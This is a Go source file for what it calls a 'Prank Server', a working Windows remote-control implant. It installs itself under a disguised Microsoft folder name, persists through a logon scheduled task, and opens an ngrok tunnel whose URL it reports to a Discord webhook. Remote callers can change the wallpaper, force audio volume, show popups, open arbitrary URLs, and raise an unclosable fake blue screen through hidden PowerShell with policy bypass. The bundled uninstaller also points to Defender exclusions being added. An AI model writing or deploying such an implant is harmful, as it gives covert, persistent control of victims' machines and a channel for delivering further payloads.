package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.ngrok.com/ngrok"
	ngrokconfig "golang.ngrok.com/ngrok/config"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	procSPI          = user32.NewProc("SystemParametersInfoW")
	procMessageBoxW  = user32.NewProc("MessageBoxW")
	procFindWindowW  = user32.NewProc("FindWindowW")
	procShowWindow   = user32.NewProc("ShowWindow")
)

type Config struct {
	Pseudo         string `json:"pseudo"`
	WebhookURL     string `json:"webhook_url"`
	NgrokAuthtoken string `json:"ngrok_authtoken"`
}

var (
	installDir string
	cfg        Config
	bsodProc   *os.Process
	bsodMu     sync.Mutex
)

func main() {
	webhook := flag.String("w", "", "Discord webhook URL")
	token   := flag.String("t", "", "ngrok auth token")
	flag.Parse()

	appdata := os.Getenv("LOCALAPPDATA")
	installDir = filepath.Join(appdata, "Microsoft", "PyService")
	os.MkdirAll(installDir, 0755)

	cfgPath := filepath.Join(installDir, "config.json")

	if *webhook != "" && *token != "" {
		hostname, _ := os.Hostname()
		cfg = Config{
			Pseudo:         hostname,
			WebhookURL:     *webhook,
			NgrokAuthtoken: *token,
		}
		data, _ := json.MarshalIndent(cfg, "", "  ")
		os.WriteFile(cfgPath, data, 0644)

		// Copie l'exe dans le dossier d'install
		self, _ := os.Executable()
		dst := filepath.Join(installDir, "svc.exe")
		if self != dst {
			copyFile(self, dst)
		}

		setupPersistence(filepath.Join(installDir, "svc.exe"))
		writeUninstall()
	} else {
		data, err := os.ReadFile(cfgPath)
		if err != nil {
			os.Exit(1)
		}
		json.Unmarshal(data, &cfg)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/wallpaper",  handleWallpaper)
	mux.HandleFunc("/audio",      handleAudio)
	mux.HandleFunc("/popup",      handlePopup)
	mux.HandleFunc("/url",        handleURL)
	mux.HandleFunc("/bsod",       handleBSOD)
	mux.HandleFunc("/bsod/close", handleBSODClose)

	handler := corsMiddleware(mux)

	ctx := context.Background()
	tun, err := ngrok.Listen(ctx,
		ngrokconfig.HTTPEndpoint(),
		ngrok.WithAuthtoken(cfg.NgrokAuthtoken),
	)
	if err != nil {
		// Fallback local si ngrok echoue
		http.ListenAndServe(":9999", handler)
		return
	}

	sendDiscord(tun.URL())
	http.Serve(tun, handler)
}

// ── Middleware CORS ───────────────────────────────────────────────────────────

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// ── Handlers HTTP ─────────────────────────────────────────────────────────────

func handleWallpaper(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(32 << 20)
	file, header, err := r.FormFile("image")
	if err != nil {
		jsonError(w, "champ image manquant", 400)
		return
	}
	defer file.Close()
	ext := filepath.Ext(header.Filename)
	if ext == "" {
		ext = ".jpg"
	}
	dst := filepath.Join(installDir, "wallpaper"+ext)
	f, _ := os.Create(dst)
	io.Copy(f, file)
	f.Close()
	go setWallpaper(dst)
	jsonOK(w)
}

func handleAudio(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(32 << 20)
	file, header, err := r.FormFile("audio")
	if err != nil {
		jsonError(w, "champ audio manquant", 400)
		return
	}
	defer file.Close()
	volume := 100
	if v, err := strconv.Atoi(r.FormValue("volume")); err == nil && v >= 0 && v <= 100 {
		volume = v
	}
	ext := filepath.Ext(header.Filename)
	if ext == "" {
		ext = ".mp3"
	}
	tmp, _ := os.CreateTemp("", "audio*"+ext)
	io.Copy(tmp, file)
	tmp.Close()
	go playAudio(tmp.Name(), volume)
	jsonOK(w)
}

func handlePopup(w http.ResponseWriter, r *http.Request) {
	var data struct {
		Title   string `json:"title"`
		Message string `json:"message"`
	}
	json.NewDecoder(r.Body).Decode(&data)
	if data.Title == "" {
		data.Title = "Message"
	}
	go showPopup(data.Title, data.Message)
	jsonOK(w)
}

func handleURL(w http.ResponseWriter, r *http.Request) {
	var data struct {
		URL string `json:"url"`
	}
	json.NewDecoder(r.Body).Decode(&data)
	if data.URL != "" {
		go exec.Command("cmd", "/c", "start", "", data.URL).Start()
	}
	jsonOK(w)
}

// ── Actions Windows ───────────────────────────────────────────────────────────

func setWallpaper(path string) {
	abs, _ := filepath.Abs(path)
	ptr, _ := syscall.UTF16PtrFromString(abs)
	procSPI.Call(0x0014, 0, uintptr(unsafe.Pointer(ptr)), 3)
}

func setSystemVolume(volume int) {
	ps := fmt.Sprintf(`$ErrorActionPreference='SilentlyContinue'
Add-Type -TypeDefinition @'
using System;using System.Runtime.InteropServices;
[ComImport,Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"),InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator{int a(int b,int c,out IntPtr d);int GetDefaultAudioEndpoint(int e,int f,out IMMDevice g);}
[ComImport,Guid("D666063F-1587-4E43-81F1-B948E807363F"),InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice{int Activate(ref Guid a,int b,IntPtr c,[MarshalAs(UnmanagedType.IUnknown)]out object d);}
[ComImport,Guid("5CDF2C82-841E-4546-9722-0CF74078229A"),InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume{int a();int b();int c();int d();int SetMasterVolumeLevelScalar(float v,ref Guid g);}
[ComImport,Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]class MMDev{}
public static class Vol{public static void Set(float v){var e=(IMMDeviceEnumerator)new MMDev();IMMDevice d;e.GetDefaultAudioEndpoint(0,1,out d);object o;var g=typeof(IAudioEndpointVolume).GUID;d.Activate(ref g,23,IntPtr.Zero,out o);var a=(IAudioEndpointVolume)o;var eg=Guid.Empty;a.SetMasterVolumeLevelScalar(v,ref eg);}}
'@
[Vol]::Set(%.2f)
`, float64(volume)/100.0)

	tmp, _ := os.CreateTemp("", "vol*.ps1")
	tmp.WriteString(ps)
	tmp.Close()
	exec.Command("powershell", "-ep", "bypass", "-windowstyle", "hidden", "-file", tmp.Name()).Run()
	os.Remove(tmp.Name())
}

func playAudio(path string, volume int) {
	abs, _ := filepath.Abs(path)

	setSystemVolume(volume)

	// openState 13 = MediaOpen (media pret a jouer)
	vbs := fmt.Sprintf(`On Error Resume Next
Dim wmp, t
Set wmp = CreateObject("WMPlayer.OCX.7")
wmp.settings.volume = 100
wmp.settings.mute = False
wmp.URL = "%s"
t = 0
Do While wmp.openState <> 13 And t < 50
    WScript.Sleep 100
    t = t + 1
Loop
If wmp.openState = 13 Then
    wmp.controls.play()
    Do While wmp.playState = 3 Or wmp.playState = 6
        WScript.Sleep 200
    Loop
End If
Set wmp = Nothing
`, abs)

	tmp, _ := os.CreateTemp("", "play*.vbs")
	tmp.WriteString(vbs)
	tmp.Close()

	exec.Command("wscript", "/nologo", tmp.Name()).Run()
	os.Remove(tmp.Name())
	os.Remove(abs)
}

func handleBSOD(w http.ResponseWriter, r *http.Request) {
	go showBSOD()
	jsonOK(w)
}

func handleBSODClose(w http.ResponseWriter, r *http.Request) {
	// Restaurer la taskbar depuis Go avant de tuer le process
	// (un process kill ne peut pas executer de code de nettoyage)
	restoreTaskbar()
	bsodMu.Lock()
	defer bsodMu.Unlock()
	if bsodProc != nil {
		bsodProc.Kill()
		bsodProc = nil
	}
	jsonOK(w)
}

func restoreTaskbar() {
	class, _ := syscall.UTF16PtrFromString("Shell_TrayWnd")
	hwnd, _, _ := procFindWindowW.Call(uintptr(unsafe.Pointer(class)), 0)
	if hwnd != 0 {
		procShowWindow.Call(hwnd, 5) // SW_SHOW
	}
}

func showBSOD() {
	ps := `Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -TypeDefinition @'
using System;using System.Runtime.InteropServices;
public class WinAPI{
[DllImport("user32.dll")]public static extern IntPtr FindWindow(string c,string w);
[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);}
'@
$tb=[WinAPI]::FindWindow("Shell_TrayWnd",$null)
[WinAPI]::ShowWindow($tb,0)
$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$W=$s.Width;$H=$s.Height;$mx=[int]($W*0.12)
$f=New-Object System.Windows.Forms.Form
$f.WindowState=[System.Windows.Forms.FormWindowState]::Maximized
$f.FormBorderStyle=[System.Windows.Forms.FormBorderStyle]::None
$f.BackColor=[System.Drawing.Color]::FromArgb(17,125,187)
$f.TopMost=$true
$f.Cursor=[System.Windows.Forms.Cursors]::WaitCursor
$f.ShowInTaskbar=$false
$f.Add_FormClosing({$_.Cancel=$true})
function L($t,$z,$y){$l=New-Object System.Windows.Forms.Label;$l.Text=$t;$l.ForeColor=[System.Drawing.Color]::White;$l.BackColor=[System.Drawing.Color]::Transparent;$l.Font=New-Object System.Drawing.Font('Segoe UI',$z);$l.AutoSize=$true;$l.Location=New-Object System.Drawing.Point($mx,$y);$f.Controls.Add($l)}
L ':(' 90 ([int]($H*0.20))
L 'Your PC ran into a problem and needs to restart.' 18 ([int]($H*0.39))
L "We're just collecting some error info, and then we'll restart for you." 18 ([int]($H*0.46))
L '0% complete' 18 ([int]($H*0.56))
L 'For more information about this issue and possible fixes, visit' 11 ([int]($H*0.70))
L 'https://www.windows.com/stopcode' 11 ([int]($H*0.74))
L 'Stop code: CRITICAL_PROCESS_DIED' 11 ([int]($H*0.78))
[System.Windows.Forms.Application]::Run($f)
`
	tmp, _ := os.CreateTemp("", "bsod*.ps1")
	tmp.WriteString(ps)
	tmp.Close()

	cmd := exec.Command("powershell", "-ep", "bypass", "-windowstyle", "hidden", "-file", tmp.Name())
	if err := cmd.Start(); err != nil {
		os.Remove(tmp.Name())
		return
	}

	bsodMu.Lock()
	bsodProc = cmd.Process
	bsodMu.Unlock()

	cmd.Wait()
	os.Remove(tmp.Name())

	bsodMu.Lock()
	bsodProc = nil
	bsodMu.Unlock()
}

func showPopup(title, message string) {
	t, _ := syscall.UTF16PtrFromString(title)
	m, _ := syscall.UTF16PtrFromString(message)
	// MB_OK | MB_ICONINFORMATION | MB_SETFOREGROUND | MB_TOPMOST
	procMessageBoxW.Call(0,
		uintptr(unsafe.Pointer(m)),
		uintptr(unsafe.Pointer(t)),
		0x00000040|0x00040000|0x00080000,
	)
}

// ── Persistence ───────────────────────────────────────────────────────────────

func writeUninstall() {
	tick := "`"
	script := `$ErrorActionPreference = "SilentlyContinue"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if (-not $isAdmin) {
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File ` + tick + `"$PSCommandPath` + tick + `"" -Verb RunAs -Wait
    exit
}

Write-Host ""
Write-Host "=== Desinstallation Prank Server ===" -ForegroundColor Cyan
Write-Host ""

$dir = "$env:LOCALAPPDATA\Microsoft\PyService"

$proc = Get-Process svc -ErrorAction SilentlyContinue
if ($proc) {
    $proc | Stop-Process -Force
    Write-Host "[OK] Processus svc.exe arrete" -ForegroundColor Green
} else {
    Write-Host "[--] Processus svc.exe non trouve" -ForegroundColor Yellow
}

schtasks /delete /tn "PyServiceHost" /f 2>$null
if ($LASTEXITCODE -eq 0) {
    Write-Host "[OK] Tache planifiee PyServiceHost supprimee" -ForegroundColor Green
} else {
    Write-Host "[--] Tache planifiee non trouvee" -ForegroundColor Yellow
}

Remove-MpPreference -ExclusionPath "$env:TEMP" 2>$null
Write-Host "[OK] Exclusion Defender supprimee : $env:TEMP" -ForegroundColor Green

Remove-MpPreference -ExclusionPath $dir 2>$null
Write-Host "[OK] Exclusion Defender supprimee : $dir" -ForegroundColor Green

if (Test-Path $dir) {
    Remove-Item $dir -Recurse -Force
    Write-Host "[OK] Dossier supprime : $dir" -ForegroundColor Green
} else {
    Write-Host "[--] Dossier non trouve : $dir" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "=== Desinstallation terminee ===" -ForegroundColor Cyan
Write-Host ""
Read-Host "Appuie sur Entree pour fermer"
`
	os.WriteFile(filepath.Join(installDir, "uninstall.ps1"), []byte(script), 0644)
}

func setupPersistence(exePath string) {
	exec.Command("schtasks", "/create",
		"/tn", "PyServiceHost",
		"/tr", exePath,
		"/sc", "onlogon",
		"/f", "/rl", "limited",
	).Run()
}

// ── Discord webhook ───────────────────────────────────────────────────────────

func sendDiscord(url string) {
	if cfg.WebhookURL == "" {
		return
	}
	time.Sleep(500 * time.Millisecond)
	now := time.Now().Format("02/01/2006 15:04:05")
	msg := fmt.Sprintf(`{"content":"**%s** est en ligne !\nURL : `+"`"+`%s`+"`"+`\n%s"}`,
		cfg.Pseudo, url, now)
	http.Post(cfg.WebhookURL, "application/json", bytes.NewBufferString(msg))
}

// ── Utilitaires ───────────────────────────────────────────────────────────────

func copyFile(src, dst string) {
	in, err := os.Open(src)
	if err != nil {
		return
	}
	defer in.Close()
	out, _ := os.Create(dst)
	defer out.Close()
	io.Copy(out, in)
}

func jsonOK(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"status":"ok"}`))
}

func jsonError(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	fmt.Fprintf(w, `{"error":"%s"}`, msg)
}
